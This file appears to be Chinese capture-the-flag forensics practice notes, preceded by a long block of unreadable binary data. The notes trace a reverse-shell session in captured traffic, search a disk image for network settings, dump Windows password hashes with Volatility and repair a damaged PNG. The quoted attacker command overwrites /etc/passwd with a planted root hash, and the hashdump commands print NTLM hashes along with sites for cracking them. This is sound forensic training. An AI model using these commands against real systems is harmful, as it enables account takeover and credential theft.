+*.[:...[Il...8.L...c..P...KQT............1(.dmJ.. \..,.9}.......\Y7.}..ZN.....E....~i.}..........W..~<.iT.I..G.....3.r.SLC...oRV..7..q.l.q`'N....`....P.,Yys.C..1h..B..N5f;.yB.jkIeT.C" .x....q.......
+?....X.q
+.....|..Z.....0X
+.C.X....+R..6.Dl.w...o.....1n.#..S.{.N..\o.../k.I...%0...W...o.,..1.V.J...7...2Y.&.....j~..>.......s..Y.^.-I..K.'.R..OI'
+...............g.`>C.U6	...`.}..c...r........|s.o{....!I.Gz....=...$o..Cs.8.F.....
+.Q.&...y...-.CS.5L.r......P.....j*.+..WN$...."..A...A..z...".1.
+.......+..g........!I.Gz....=...$o..Cs.8.F.....
+.Q.&...y...-.CS.5L.r......P.....j*.+..WN$...."..D	.X.{.......n!.!/_..h2-q..j.....k.. .)D.f:....}7...a.e..W...p.pG..cd.S..E#..-...[$>f......AN....'....,\....1c9...G.......I[........?....RwH...Iq.......*!.....@.........J..........._p...........V.8+.Mv...n.,4.gSw..e.VP...e..%.N..............q.......
+?....X.q
+.....|..Z.....0X
+.C.X....+R..6.Dl.w...o.....1n.#..S.{.N..\o...{.alV	k]!.Gj...>..Y...}_...`5.e.....j...8bk...P...po._,C.
+.I......Qp.e..*U.m.m?.Y~x...&......J....,FE...w.dV...n.i..G.........
+#a..p..Gn).+.U.P.h...7Z.I....\.............+(7..gw..9,ip.....F.o.-9..%.K.{
+-......-.U.q... B...-.....%....&.....y?..{ m...@B(........iA.>D. ...&11.."..P...a.[.`0.m..Uz.....P...+.DV...y..........2n.
+...Hp.*=...^.3.K.TB!..I.r 2...x.mX....x.q..n..o.lu....?.....2.....[#.....)..8...`(.......7mg...{....:aa.F...o..........o..........d.U......./...p..,.~..3...D.x.7b\K
+....aq(X#..v..:R..$..	?.9.7q?a...`f@..../.J}........B..f.uD.....N{...h._...(.}.}.Q.....q!1..[.'..H..m..0....g!.TEIq|MbN.!?M..M0n....2P........+T..\_...>....P.P.6..Z.t.....V."..].h.AJ....."P.PU.DPK...,[W..;	G..NW.....z.
+b.../x.P..k...Rm*.K.
+H...8~$.W....7..Hi....q....}&......'4H.".".>V.s.i.....	<..[..)......f.U....fV..C....LY.Lwz....A..Y...+..!3QQ.Z.3...._..r.\..[..Q...=.S..<.(9.(..\A..[K...iuB:EM...+..*...*.x.SJ.......gX!..
+.LD...v.7.j.
+E]u........ J...... .9......Z...<(y.s....K*....)}Dd|H.
+.h....6...u6.._(o......	..nD24z..D.q....\..........G.$%..(...o.@.....cjK..k..X...Jz..I ..Q..M j......;.>
+.I.q...G......3g..4.yM....g.,.?.....B............6r>.F...u..../j...i.8...t..r.......!.8..`T..T.w.`..edB.EV..++J...XPU........T9.m:....m.........w...}.J.......C.Y....^.O?.U4OMJ.}hV.Y.iT.
+:..Y.m[...:..)...."....'k..@../....cA.-..X..H.d.m.=.>...h.;..0.iC.Z......G.2YU..s..4.0P/.][..?...W.t..!...F...(......zk/..M....$...k.V..g..r(..;.>..i.R.V.xT.....q.`2......@..5&t....d0d.{...n5sp....-......VL...e.....j...8bk...P...po._,C.
+.I......Qp.e..*U.m.m?.Y~x...&......J
+%.I..;.....:j4.z?..)...v..(..!...HC...d.CB.._-]u..yt.N...*1P...".y..x..O....w~.rC.}...6...E{.w.a.S.. <!#....6.'..[y_p..........7.......@...P..".R...<......AE...p.............W.s[.D=..e...?..Sc..@t.w...' '.SL.['.
+7..1d9\..%.J9,..{...2...."{....x..ww..(n>.lb....()*..7z...."c7Dx...".-....v`ifz.O!.Dn...E..5......P...b.`Uq}..U....).x#.F.4.$lW..d..Q....3.	.y.`..5j'4..R..+..B....../.@....n+G..,N,..<.w.d.u..n
+Ao..S....f./.....qh...... 5......wg......<..[A..X.M@....I...u.$$..~#*.........!I.Gz....=...$o..Cs.8.F.....
+.Q.&...y...-.CS.5L.r......P.....j*.+..WN$...."..A..6.o.s...M..T..}/.l5...#.B1.W..Pq..~.O#.4.}..mI...!.{..>.x+0..\..G&.t@.L/ ..W.'...EY..
+z....+.%....b.....{kM0...I..+.'.3..Mr$......Y~......TGQ..4.w..W.].x.@.]...M.......	..N.r#i....t..YT..q..	-7.......cEf.8....+.r/.;,.?.1.5|.}m....t..0.[...7..q.Q.^+w.7)..y..%M4.....eOu(H.\.:.|..F..~p[....6..*_....cd..S7c&&..{e...... 7@......h.......I.|...\C.Ixt\....R..u.zq..#..%..(!.n...:...L'jTVC.1P........wS~....S..r.JOh(..*....E_...A..P........#...'.e...f
+=.k....f....	vhN-.L&...Tjhy...?.i....R...>r?.....FLG].an...y....H...t..U	F...PE.............U..;..W1..4./Q..".|..[u*d0....y..o#..iV.+.=....anX..X@E7&{....M..t.....ru.T9......AD.......WX...
+-&.. .E...j.a.~.....F.I.e.....T.../....%..L.-'....S.OU".k"..13p..v%....y.........
+...c..=__7_.!.........(..R....D!.....@B.3._..h.....J.....:f..t...u...)..K.....l7.%.".......
+t..........3..... n............X.JK..R..M.Xf...$....*...]D.$.dH.....nHdZ.~..f...H..p...2n.
+...Hp.*=...^.3.K.TB!..I.r 2...x.mX....x.q[..9......x.$4.s.......k.
+......c.......\......L.....f..\.z*..m9..ct..p.......&.#/.pV9;...|v^...3r.x...W.|.......O,7.....EhdL.n.J7K.,../m.....T3t.C/[-....q.)b.....[.._.......r%.'(..a%...f....s..X.!Y..vf.GD.....Pu.vy...>.5....G[ X.n.........~.x	YH..B..s.v.e.......=!S...'D
+.=.+:-...1...$...#.e0>\..Jt}-Fi.LS.h...!....N].-0.a...:}..E.q.....9..zi	.,......L...>z.#....X..(%..^[=..{v..N..k...e.V..:....YJ<Uf41 .....
+X*.Q..w|...]sy.X/...R.%.0..5..B..H.0.............ME..q...".B...HI..v...i.0..e..!2R...;.s.......w...vD....h...(..:`....ox(k...;`....C.......}...F...V......QM........b$...tS.Y.M..V...w.Y..n..-=.....?Q/...Cc..F.r.m.=J.,c K$B27.w..X..Q..z...a....J....p...6..T4...cR.9LY.......]'.B....BK.s.....XdS.Eh..C.~k.T....Rpx.M..'...f..j.P........3.l	;...%............ME...v.8.}.`.d.....KYTc.....]~...._(O...-.4!......2.[.;FT.?.c..}.....(....|..{Z.<....[F..3..v..o.......K.d.R+B.X.<.<;......H.Pz.....O2?.R...d..e...y...V..d.5...y...........a....gZ...-_.`....v...v....mYk.9..9. ..P....k..~.......o.j%...E...p...(4#...v....[..H.Cib.|]...k.X.VS...h...I.Gu..V.b.........Q...Vo"../..E....7..u.d...`h..-..,.HF..^.uN.*...........n..'}...h...l.8.X...E. .B...f.....J.~..i.Q.$..X...N......w.<...d.Y@....l...R..u.#u.....&./Aa....*...........O....x...tpwV.y.CmA}...;...@.l..7..X....e..+.;...c..n...$.;.W<.".e.X..|\................QV1.../.A,m.)._.../.O.ECt.(.Rf....~..$..I5.n>.B.P|.b....Y..G.TT.5...d.q......R.)...t.......K.P....C..D......c[....
+..3....q9......].+..s...g8..(.k).\..\/I}..e.#.^.axG..^...@..O&.j.isBd.....IUi.TIL../.H.....H.m.@......Q.@).{...[.d!J..m-&....+	c.;.....
+._L!......Z......:x.=...Y.&......C.(.....~d.p..$9~2W... ...
+.O..
+p|Rq$....R.;..
+c..."r....i..+qw3........v._4.|.&|:4..O.
+....0w....].[..
+L...#...g(.+P.-.5...$..R......u...v,'y{.\H.......d.{!M.....|.z
+.......o.i.jY..).J.......t.R......0cW...*.s.Ow...1.o.. .......sA..H..FTN...K........D....Z......B...d.E..68F........@.... .I
+t........{n...o.}7..t...K.....Q...^........+.v.@.pYq...C6]..z........*...b...........D..>..*....^l._...IA.M@.a..W/.E(.....v..x..... .~.."....&o..)[...#.u.og.10...r.......
+...........R..G.dW..[sG<3.'....R.^O.....9..!.......2".Mcj.[....f.+....$...Q..k.....b...............@fH.....h.2 .....n..h.....a.q..z.O:l.........B..7.@Z.U?.,.z.....(.a..e...[...V.....f/R.{.J..Tr....k..~.a...3.<xVG...
+l..~u..Q.}[N.f.....h.>./....`....(+1Q.T.;./...:....L.p..n>
+:uG.
+{.F........S.1b8K..[....dS.6...T.eG..~....?(.....$....1..,.....FD...A.}W..5R_..m.&zm;Jt..PV...MtI...C.?./....j\4.	........-.....
+.D"_..9.w...V.zL....
+c.B'.5|.}m....t..0.[.@........;.N.. X%z.....I......BZ.<. _...wT"#....w....+Z@.{.>.d....!..D...4.<...h.9.... J.A.............8...-..P.....h.P.+......h.9.... J.A........?.s..dAMV..^$a.<s%-.P..........i....=.2...rX....`&$%..c>.E.0z...o,.........!.^.xJ.V._.s?.....t.......x......~.-k....oCd..D.
+.?.).!....O)..s]..pe...^.m....j....9rj.<...>.}}.D..........#..e.;............+(7.....G*.B<.......e.Q........[#...Aj:....C8..K..\........Jb...."|;...9wl..YjeDZ4..*.W.6U/....pr.+...<v@<.zp.......e.hAG8.Dd.......Hu.s.."...,..3...)..n..]?y.:...2.....H.u...P*.v.....?.......... :.6.i..(..Yz.....+.+...........~....-.B....J..&..@..oK....$4w......g.{Zi...o.A...SaP..b...%...YG......;..-....py......&".=v..'..KCC.X. /<a....+
+.......6.R7...........85..	...H....,T.Pj.j..h..|.E*..5.<aHC^.'.c.R..1a......u..7.w.z>.v.......@....o.`f./. k.(L...-0.....1....p+..!....`O5W.......~.Dy
+..$Y.}..(dyZ.u...o..L)...D.#.-."..?......s....'4U?.IA.)*.O...
+.@.w.%..#..iq.N...+.l..y.0x.P..2..XL..VZ+.e$...3w.../..|Oli{...........i..p..&9.5X.{.1..M=D5R_..m.&zm;Jt..PD...."|..|.
+.*..F)...!,.B...p..H.y{...&.W..R..'....:.V....R.~.S....T..d..LQ2^.0,V....#...I....;.7.....=[..<E..vT...9.q.....i...~....
+o..<..@.u6:.bc....y<3..]"..
+
+（2）黑客通过后门反连执行（反连IP：202.1.1.129:9999）的第一条命令是什么（若为拼接命令，只取前半部分）？答案提交格式为：flag{命令}
+参考文章：
+找到反弹shell的地址202.1.1.129:4444
+在流量包中筛选4444端口，然后追踪流
+找到stream 284:
+
+echo WLpoAWLex8nkqQ5
+
+WLpoAWLex8nkqQ5
+
+
+cat /etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+avahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+polkitd:x:999:998:User for polkitd:/:/sbin/nologin
+tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+geoclue:x:998:996:User for geoclue:/var/lib/geoclue:/sbin/nologin
+rtkit:x:172:172:RealtimeKit:/proc:/sbin/nologin
+colord:x:997:995:User for colord:/var/lib/colord:/sbin/nologin
+pulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
+gdm:x:42:42::/var/lib/gdm:/sbin/nologin
+chrony:x:996:992::/var/lib/chrony:/sbin/nologin
+tomcat:x:1000:1000::/home/tomcat:/bin/bash
+
+echo -e "root:\$6\$KHysqjWMnoaHJ4QW\$p1cMTekiYb/6xA2u7j4jAD3m5shTPlPAtM6jyoex73MxxHXlms4X0874ml/gw6.LETsMs5oXLWyGeSAddx2N..:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\ngames:x:12:100:games:/usr/games:/sbin/nologin\nftp:x:14:50:FTP User:/var/ftp:/sbin/nologin\nnobody:x:99:99:Nobody:/:/sbin/nologin\navahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologin\ndbus:x:81:81:System message bus:/:/sbin/nologin\npolkitd:x:999:998:User for polkitd:/:/sbin/nologin\ntss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin\npostfix:x:89:89::/var/spool/postfix:/sbin/nologin\nsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin\nsystemd-network:x:192:192:systemd Network Management:/:/sbin/nologin\ngeoclue:x:998:996:User for geoclue:/var/lib/geoclue:/sbin/nologin\nrtkit:x:172:172:RealtimeKit:/proc:/sbin/nologin\ncolord:x:997:995:User for colord:/var/lib/colord:/sbin/nologin\npulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin\ngdm:x:42:42::/var/lib/gdm:/sbin/nologin\nchrony:x:996:992::/var/lib/chrony:/sbin/nologin\ntomcat:x:1000:1000::/home/tomcat:/bin/bash\n" > /etc/passwd
+cat /etc/passwd
+
+root:$6$KHysqjWMnoaHJ4QW$p1cMTekiYb/6xA2u7j4jAD3m5shTPlPAtM6jyoex73MxxHXlms4X0874ml/gw6.LETsMs5oXLWyGeSAddx2N..:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+avahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+polkitd:x:999:998:User for polkitd:/:/sbin/nologin
+tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+geoclue:x:998:996:User for geoclue:/var/lib/geoclue:/sbin/nologin
+rtkit:x:172:172:RealtimeKit:/proc:/sbin/nologin
+colord:x:997:995:User for colord:/var/lib/colord:/sbin/nologin
+pulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
+gdm:x:42:42::/var/lib/gdm:/sbin/nologin
+chrony:x:996:992::/var/lib/chrony:/sbin/nologin
+tomcat:x:1000:1000::/home/tomcat:/bin/bash
+
+
+实验3:
+第3次练习-电子取证方向
+第13题/共13题
+
+请你对ide0_disk.vmdk进行取证分析，回答以下问题：
+
+（1）分析镜像找出服务器的静态ip地址为多少？答案提交格式为：flag{ip地址}
+（2）分析镜像找出服务器的主机名是什么？答案提交格式为：flag{主机名}
+
+(1)关键字搜索
+(base) MacBook-Pro-3:第3次练习-电子取证方向附件 zhangyuanyi$ strings ide0_disk.vmdk | egrep -n 'IPADDR|BOOTPROTO|ifcfg-|address:|addresses:|inet addr|inet ' | sed -n '1,200p'
+1102111:Overrun, failed TD address: %p, index: %d
+1102112:Underrun, failed TD address: %p, index: %d
+1580092:- ifcfg-rh: unescape Team configuration (rh #1051517)
+1580163:- ifcfg-rh: add support for alias files (rh #1067170)
+1580165:- ifcfg-rh: give a better error on "permission denied" (rh #1070617)
+1580177:- ifcfg-rh: fix reading and writing of Team port configurations (rh #1074160)
+1580221:- ifcfg-rh: ignore tailing spaces (rh #1100336)
+1580246:- core, ifcfg-rh, ibft: add support for iBFT VLAN connections (rh #990480)
+1580249:- ifcfg-rh: fix a crash on setting hostname with SELinux disabled (rh #1122826)
+1580252:- ifcfg-rh: write GATEWAY instead of GATEWAY0 to be ifup-compatible (rh #1105770)
+1580292:- ifcfg-rh: read custom IP address for shared connections (rh #1174632)
+1580294:- ifcfg-rh: add reading and writing of route-metric property
+1580299:- ifcfg-rh: handle DEVTIMEOUT property (rh #1171917)
+1580339:- ifcfg-rh: ignore GATEWAY from network file for DHCP connections (rh #1262972)
+1580361:- ifcfg-rh: respect DEVTIMEOUT if link is not announced by udev yet (rh #1192633)
+1580465:- ifcfg-rh: clear IP settings for slave connections (rh#1368761)
+1580466:- ifcfg-rh: accept TEAM connections also without DEVICETYPE setting (rh#1367180)
+1580469:- ifcfg-rh: ensure master is cleared when updating a connection (rh #1355656)
+1580525:- ifcfg-rh: fix reading team slave types of vlan type (rh #1427482)
+1580538:- ifcfg-rh: write the master device name even if the master property is an UUID (rh #1369008)
+1580539:- ifcfg-rh: higly improved parsing of ifcfg files (rh #1369380)
+1580546:- ifcfg-rh: fix import of 802.1x connections with empty EAP-TLS identity (rh #1391477)
+1580559:- ifcfg-rh: write the master device name even if the master property is an UUID (rh#1369091)
+1580585:- ifcfg-rh: fix writing legacy NETMASK value (rh #1445414)
+1580598:- ifcfg-rh: omit empty next hop for routes in legacy format (rh #1452648)
+1580622:- ifcfg-rh: also check BONDING_OPTS to determine the connection type (rh #1434555)
+1580663:- ifcfg-rh: persist the wep key type (rh #1518177)
+1580673:- ifcfg-rh: fix write of 802.1X EAP-LEAP connections (rh #1374660)
+1580684:- ifcfg-rh: allow updates to connections with routing rule files (rh #1384799)
+1580747:- ifcfg-rh: fix IPv4 settings in combination with method "shared" (rh #1519299)
+1580748:- ifcfg-rh: fix handling unset Wi-Fi mode (rh #1549972)
+1590366:  - The Egyptian Cabinet announced that DST will be cancelled for 2015.
+1590371:- The Egyptian Cabinet announced that DST will be cancelled for 2015.
+1598497:libnm-settings-plugin-ifcfg-rh.so
+1598561:libnm-settings-plugin-ifcfg-rh.so
+1599331:nm-settings-ifcfg-rh.5.gz
+1599335:nm-ifcfg-rh.conff
+1602204:BOOTPROTO=static
+1602208:IPADDR=110.42.6.198
+
+flag{110.42.6.198}
+
+(2)在二进制 VMDK 里用文本搜索常见主机名位置与关键字：
+strings ide0_disk.vmdk \
+  | egrep -ni '(^|/)(etc/hostname|/etc/hosts|/etc/sysconfig/network|HOSTNAME=|hostname|127\.0\.0\.1|127\.0\.1\.1)' \
+  | sed -n '1,200p'
+
+/*关键命令*/
+用 Volatility 的 LSA / Hashdump 插件尝试提取（如果上面没发现明文）
+
+这些命令尝试从 SAM/LSASS 中提取密码或 NTLM 哈希（需要镜像包含相关内存结构）：
+
+# lsadump (Vol3)
+vol -f pc.dmp windows.lsadump.Lsadump
+
+# 尝试导出 SAM/NTLM 哈希
+vol -f pc.dmp windows.hashdump.Hashdump
+
+(base) MacBook-Pro-3:第4次练习-电子取证方向附件 zhangyuanyi$ vol -f pc.dmp windows.hashdump.Hashdump
+Volatility 3 Framework 2.26.0
+Progress:  100.00		PDB scanning finished                        
+User	rid	lmhash	nthash
+/Users/zhangyuanyi/Library/Python/3.9/lib/python/site-packages/volatility3/framework/deprecation.py:106: FutureWarning: This plugin (volatility3.plugins.windows.hashdump.Hashdump) has been renamed and will be removed in the first release after 2025-09-25. Please ensure all method calls to this plugin are replaced with calls to volatility3.plugins.windows.registry.hashdump.Hashdump
+  warnings.warn(
+
+Administrator	500	aad3b435b51404eeaad3b435b51404ee	31d6cfe0d16ae931b73c59d7e0c089c0
+Guest	501	aad3b435b51404eeaad3b435b51404ee	31d6cfe0d16ae931b73c59d7e0c089c0
+taqi7	1000	aad3b435b51404eeaad3b435b51404ee	7f21caca5685f10d9e849cc84c340528
+naizheng	1002	aad3b435b51404eeaad3b435b51404ee	d123b09e13b1a82277c3e3f0ca722060
+qinai	1003	aad3b435b51404eeaad3b435b51404ee	1c333843181864a58156f3e9498fe905
+(base) MacBook-Pro-3:第4次练习-电子取证方向附件 zhangyuanyi$ 
+
+7f21caca5685f10d9e849cc84c340528 即为密码md5值：在https://www.cmd5.com/ 或者https://hashes.com/zh/decrypt/hash 去破解得到密码：anxinqi
+
+某机关截获了某间谍发出的一张图片，但图片已经损坏，请你对该图片进行数据恢复，获取其发出图片中的内容。答案提交格式为：flag{xxx}
+
+
+直接在文件前面预置 PNG 签名
+在当前目录执行：
+(base) MacBook-Pro-3:第4次练习-电子取证方向附件 zhangyuanyi$ cp photo.png photo.png.bak
+(base) MacBook-Pro-3:第4次练习-电子取证方向附件 zhangyuanyi$ printf '\x89PNG\r\n\x1a\n' | cat - photo.png > photo_fixed.png
+
+如果前 32 字节显示类似下面（开始有 PNG 魔数和 IHDR）就成功了:
+(base) MacBook-Pro-3:第4次练习-电子取证方向附件 zhangyuanyi$ hexdump -C -n 32 photo_fixed.png | sed -n '1,4p'
+00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|
+00000010  00 00 05 85 00 00 03 67  08 02 00 00 00 e1 8b a0  |.......g........|
+00000020
+此时可以直接打开图片看到flag
+
